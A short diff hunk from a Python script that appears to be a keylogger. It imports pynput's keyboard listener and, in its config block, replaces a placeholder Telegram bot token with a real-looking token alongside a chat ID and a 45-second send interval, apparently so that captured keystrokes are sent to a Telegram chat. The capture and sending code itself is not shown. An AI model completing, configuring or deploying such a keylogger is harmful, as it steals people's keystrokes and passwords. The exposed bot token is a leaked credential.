@@ -8,7 +8,7 @@ from datetime import datetime
 from pynput import keyboard
 
 # ============= CONFIG =============
-TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
+TELEGRAM_BOT_TOKEN = "8303464927:AAGq6lwHcTsYYOAbDUFkH9YTfHUzFAaq2dU"
 TELEGRAM_CHAT_ID = "-1004320842899"
 SEND_INTERVAL = 45
 # =================================
